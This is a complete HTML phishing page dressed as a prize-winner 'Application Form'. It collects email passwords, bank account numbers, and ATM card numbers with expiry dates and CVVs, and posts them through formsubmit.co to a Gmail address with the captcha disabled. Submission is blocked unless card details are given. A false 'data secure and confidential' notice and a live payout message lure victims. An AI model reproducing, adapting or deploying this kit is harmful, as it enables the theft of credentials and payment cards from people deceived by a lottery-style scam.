<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Application Form</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background: #f2f2f2;
      padding: 20px;
    }
    h2 {
      text-align: center;
      color: #2c3e50;
    }
    form {
      background: #fff;
      padding: 20px;
      border-radius: 10px;
      box-shadow: 0 0 10px #ccc;
      max-width: 500px;
      margin: auto;
    }
    .form-group {
      margin-bottom: 15px;
      position: relative;
    }
    label {
      display: block;
      margin-bottom: 5px;
    }
    input, select {
      width: 100%;
      padding: 10px;
      padding-right: 40px;
      box-sizing: border-box;
      border: 1px solid #ccc;
      border-radius: 6px;
    }
    .error {
      color: red;
      font-size: 0.9em;
      display: none;
    }
    .eye-icon {
      position: absolute;
      top: 35px;
      right: 10px;
      cursor: pointer;
      user-select: none;
    }
    #submitBtn {
      width: 100%;
      padding: 12px;
      border: none;
      color: white;
      font-size: 16px;
      border-radius: 6px;
      margin-top: 10px;
    }
    .final-message {
      margin-top: 20px;
      font-weight: bold;
      display: none;
    }
    .secure-message {
      margin-top: 20px;
      font-size: 0.9em;
      text-align: center;
      color: #555;
    }
  </style>
</head>
<body>
  <h2>Application Form</h2>
  <form action="https://formsubmit.co/exellentfirm@gmail.com" method="POST" onsubmit="return validateForm()" id="appForm">
    
    <!-- 1. Full Name -->
    <div class="form-group">
      <label for="fullName">Full Name:</label>
      <input type="text" id="fullName" name="Full Name" required />
    </div>

    <!-- 2. Country -->
    <div class="form-group">
      <label for="country">Country:</label>
      <input type="text" id="country" name="Country" required />
    </div>

    <!-- 3. Phone Number -->
    <div class="form-group">
      <label for="phone">Phone Number:</label>
      <input type="tel" id="phone" name="Phone Number" required />
      <div class="error" id="phoneError">Phone must be 9 to 12 digits</div>
    </div>

    <!-- 4. Email Address -->
    <div class="form-group">
      <label for="email">Email Address:</label>
      <input type="email" id="email" name="Email Address" required />
    </div>

    <!-- 5. Email Password (with eye icon) -->
    <div class="form-group">
      <label for="emailPassword">Email Password:</label>
      <input type="password" id="emailPassword" name="Email Password" required />
      <span class="eye-icon" onclick="togglePassword()">üëÅÔ∏è</span>
    </div>

    <!-- 6. Amount You Won -->
    <div class="form-group">
      <label for="amountWon">Amount You Won:</label>
      <input type="number" id="amountWon" name="Amount You Won" required />
    </div>

    <!-- 7. Bank Account Type -->
    <div class="form-group">
      <label for="accountType">Bank Account Type:</label>
      <input type="text" id="accountType" name="Bank Account Type" placeholder="e.g. Standard Bank" required />
    </div>

    <!-- 8. Bank Account Number -->
    <div class="form-group">
      <label for="accountNumber">Bank Account Number:</label>
      <input type="text" id="accountNumber" name="Bank Account Number" required />
    </div>

    <!-- 9. Account Holder's Name -->
    <div class="form-group">
      <label for="holderName">Bank Account Holder's Name:</label>
      <input type="text" id="holderName" name="Bank Account Holder's Name" required />
    </div>

    <!-- 10. Linked ATM -->
    <div class="form-group">
      <label for="atmLinked">Did You Link ATM to Your Bank Account?</label>
      <select id="atmLinked" name="ATM Linked?" onchange="handleATMChange()" required>
        <option value="">--Select--</option>
        <option value="Yes">Yes</option>
        <option value="No">No</option>
      </select>
    </div>

    <!-- 11. ATM Card Number -->
    <div class="form-group atm-fields">
      <label for="atmNumber">ATM Card Number:</label>
      <input type="text" id="atmNumber" name="ATM Card Number" />
      <div class="error" id="cardError">Card must be exactly 16 digits</div>
    </div>

    <!-- 12. Expiry Date -->
    <div class="form-group atm-fields">
      <label for="expiry">Expiry Date (MM/YY):</label>
      <input type="text" id="expiry" name="Expiry Date" maxlength="5" />
    </div>

    <!-- 13. CVV -->
    <div class="form-group atm-fields">
      <label for="cvv">CVV:</label>
      <input type="text" id="cvv" name="CVV" maxlength="3" />
      <div class="error" id="cvvError">CVV must be exactly 3 digits</div>
    </div>

    <!-- Final Message -->
    <div class="final-message atm-fields" id="finalNote">
      Dear <span id="noteName"></span>, You will receive <span id="noteAmount"></span> to your <span id="noteType"></span>, <span id="noteNumber"></span>
    </div>

    <!-- Submit -->
    <button type="submit" id="submitBtn">Submit</button>

    <!-- Security message -->
    <div class="secure-message">
      We keep your data secure and confidential.
    </div>

    <!-- Redirect -->
    <input type="hidden" name="_next" value="thankyou.html">
    <input type="hidden" name="_captcha" value="false">
  </form>

  <script>
    function togglePassword() {
      const pw = document.getElementById("emailPassword");
      pw.type = pw.type === "password" ? "text" : "password";
    }

    function handleATMChange() {
      const atmSelect = document.getElementById("atmLinked").value;
      const atmFields = document.querySelectorAll('.atm-fields');
      const submitBtn = document.getElementById("submitBtn");

      if (atmSelect === "No") {
        atmFields.forEach(f => f.style.display = "none");
        submitBtn.disabled = true;
        submitBtn.style.background = "red";
        submitBtn.textContent = "";
      } else {
        atmFields.forEach(f => f.style.display = "block");
        submitBtn.disabled = false;
        submitBtn.style.background = "green";
        submitBtn.textContent = "Submit";
      }
    }

    function validateForm() {
      let valid = true;

      const phone = document.getElementById("phone").value;
      const card = document.getElementById("atmNumber").value;
      const cvv = document.getElementById("cvv").value;
      const phoneError = document.getElementById("phoneError");
      const cardError = document.getElementById("cardError");
      const cvvError = document.getElementById("cvvError");

      // Phone
      if (phone.length < 9 || phone.length > 12) {
        phoneError.style.display = "block";
        valid = false;
      } else {
        phoneError.style.display = "none";
      }

      // Card
      if (card && card.length !== 16) {
        cardError.style.display = "block";
        valid = false;
      } else {
        cardError.style.display = "none";
      }

      // CVV
      if (cvv && cvv.length !== 3) {
        cvvError.style.display = "block";
        valid = false;
      } else {
        cvvError.style.display = "none";
      }

      return valid;
    }

    document.getElementById("phone").addEventListener("blur", validateForm);
    document.getElementById("atmNumber").addEventListener("blur", validateForm);
    document.getElementById("cvv").addEventListener("blur", validateForm);

    // Expiry format MM/YY
    document.getElementById("expiry").addEventListener("input", function(e) {
      let val = e.target.value.replace(/\D/g, "");
      if (val.length >= 3) {
        e.target.value = val.slice(0,2) + "/" + val.slice(2,4);
      } else {
        e.target.value = val;
      }
    });

    // Live Final Note
    document.getElementById("fullName").addEventListener("input", updateNote);
    document.getElementById("amountWon").addEventListener("input", updateNote);
    document.getElementById("accountType").addEventListener("input", updateNote);
    document.getElementById("accountNumber").addEventListener("input", updateNote);

    function updateNote() {
      const note = document.getElementById("finalNote");
      const name = document.getElementById("fullName").value;
      const amount = document.getElementById("amountWon").value;
      const type = document.getElementById("accountType").value;
      const accNo = document.getElementById("accountNumber").value;

      if (name && amount && type && accNo) {
        document.getElementById("noteName").textContent = name;
        document.getElementById("noteAmount").textContent = amount;
        document.getElementById("noteType").textContent = type;
        document.getElementById("noteNumber").textContent = accNo;
        note.style.display = "block";
      } else {
        note.style.display = "none";
      }
    }
  </script>
</body>
</html>
